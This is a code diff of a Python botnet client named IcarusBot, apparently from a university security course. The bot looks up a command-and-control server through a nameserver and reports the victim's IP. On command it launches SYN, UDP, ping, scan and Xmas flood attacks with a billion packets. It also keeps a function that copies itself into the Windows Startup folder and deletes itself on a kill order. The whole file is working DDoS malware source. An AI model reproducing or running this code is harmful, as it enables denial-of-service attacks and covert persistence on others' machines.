@@ -2,13 +2,11 @@
 import bandwidth_ddos
 import getpass
 import json
-import math
 import os
 import ping_flood
 import requests
 import scan_flood
 import shutil
-import signal
 import socket
 import speedtest  # This is contained within the working directory
 import syn_flood
@@ -18,13 +16,10 @@ import multiprocessing as mp
 import time
 import udp_flood
 import xmas_attack
-# import win10toast
 from os import remove
 from sys import argv
 from config import API_URL
-from enum import Enum
 from socket import timeout
-# from win10toast import ToastNotifier
 
 BOT_ID_NAME = ''  # Replace this for each new bot handed out.
 NUM_PACKETS_TO_SEND = 1000000000
@@ -57,10 +52,12 @@ class IcarusBot:
                     5. It will then call the main_loop(), which will sit and wait for a response from the C2 server for a command.
                         5.1: Refer to the main_loop() function for details about how it handles the protocol.
         """
+        file = open("bot_name.txt", "r")
         global BOT_ID_NAME
         global NUM_PACKETS_TO_SEND
-        BOT_ID_NAME = sys.argv[0].split("\\")[-1].split(".")[0]
+        BOT_ID_NAME = file.read()
         print(BOT_ID_NAME, "IS RUNNING")
+
         print("GAUGING SPEED")
         st = speedtest.Speedtest()
         st.get_servers()
@@ -72,17 +69,21 @@ class IcarusBot:
         self.bot_id = BOT_ID_NAME  # should be random or grabbed somehow from victim computer
         self.ip = requests.get('https://api.ipify.org').content.decode('utf8')
         self.c2_server_details = ()
+
         self.status = 'STARTED'
         self.attack_type = 'NONE'
         self.attack_runtime = 0  # Used for tracking duration of attack.
         self.target_ip = ''
+
         self.exceptionsThrown = 0  # Tracks errors thrown during operation.
+
         # This is to deal with the active subprocess
         self.mp = None
+
         # This will constantly run and update with the nameserver.
         threading.Thread(target=self.update_with_nameserver, daemon=True).start()
         # Now we go and look for the C2 server.
-        add_to_startup()
+
         while True:
             print("contacting nameserver")
             nameserver_available = False
@@ -91,7 +92,7 @@ class IcarusBot:
                 self.c2_server_details = tuple(requests.get(f'{API_URL}/api/lookup/c2').text.split("::"))
                 print(self.c2_server_details)
                 if self.c2_server_details[0] != 'not_active' and self.c2_server_details[1] != 'not_active':
-                    # there is a server available, let's go ahead and connect, ignoring the nameserver again until they disconnect.
+                    # There is a server available, let's go ahead and connect, ignoring the nameserver again until they disconnect.
                     nameserver_available = True
                     time.sleep(5)
             # Now that we've got the C2 server IP, let's go ahead and setup the socket for connecting.
@@ -129,10 +130,10 @@ class IcarusBot:
             2. If it times out (30 seconds)
                 2.1 disconnect with the webserver and ignore it.
                 2.2 Go back to asking the nameserver for a IP address for a C2 server.
-                2.3 If an error occurs (any at all), disconnect and re-connect to the nameserver.
         """
         self.status = 'IDLE'
-        # Now we notify the C&C server of our existence
+
+        # Now we notify the bot of our existence
         init_message = {
             'ip': self.ip,
             'status': self.status,
@@ -184,7 +185,6 @@ class IcarusBot:
                             self.target_ip = target_ip
 
                         if attack_type == 'SYN_FLOOD':
-                            # The following code is hilariously long and redundant, but who cares?
                             if self.mp is None:
                                 self.mp = mp.Process(target=syn_flood.SYN_Flood,
                                                      args=(target_ip, NUM_PACKETS_TO_SEND, portList))
@@ -274,7 +274,6 @@ class IcarusBot:
                 elif request_type == 'stop':
                     if self.mp is not None:
                         self.mp.terminate()
-                    # notification("STOPPED")
                     self.status = "IDLE"
                     self.attack_type = "none"
                     self.target_ip = "none"
@@ -293,7 +292,6 @@ class IcarusBot:
                 # This will then send the message back to the server, irrespective of the flag.
                 elif request_type == 'kill':
                     self.status = "DEAD"
-                    # notification("DEAD")
                     response = {
                         'ip': self.ip,
                         'status': self.status,
@@ -307,7 +305,6 @@ class IcarusBot:
                     response = json.dumps(response)
                     self.sock.sendto(str.encode(response), (self.c2_server_details[0], int(self.c2_server_details[1])))
                     remove(argv[0])
-                    sys.exit(0)
                 time.sleep(2)
                 self.sock.sendto(str.encode(response), (self.c2_server_details[0], int(self.c2_server_details[1])))
             except timeout:
@@ -318,26 +315,6 @@ class IcarusBot:
                 print("EXCEPTION", ex)
                 self.exceptionsThrown += 1
                 return
-
-    #
-    # def lookup(self):
-    #     """sends request to nameserver to get command ip and port"""
-    #     r = requests.get(f'{API_URL}/api/lookup/bot/{self.bot_id}')
-    #     if (r.status_code == 200):
-    #         self.command_ip, self.command_port = r.text.split('::')
-    #         print(self.command_ip)
-    #         print(self.command_port)
-    #
-    # def update(self):
-    #     """updates nameserver with ip and port"""
-    #     self.update_thread.start()
-
-    #
-    # def start(self):
-    #     self.update()
-    #
-    # def notification(self, param):
-    #     pass
 
 
 def notification(action):
@@ -374,17 +351,15 @@ def notification(action):
 
 
 def add_to_startup(file_path=""):
-    # This will add it to the startup folder.
     if file_path == "":
         file_path = os.path.realpath(sys.argv[0])
-    exe_path = f"{os.environ['SYSTEMDRIVE']}\\Users\\{getpass.getuser()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{BOT_ID_NAME}.exe"
+    exe_path = f"{os.environ['SYSTEMDRIVE']}\\Users\\{getpass.getuser()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\coms4507-bot.exe"
     # only copy across if startup directory exists and file doesn't
     if os.path.exists(os.path.dirname(exe_path)) and not os.path.exists(exe_path):
         shutil.copy(file_path, exe_path)
 
-#
-def main():
 
+def main():
     IcarusBot()
 
 
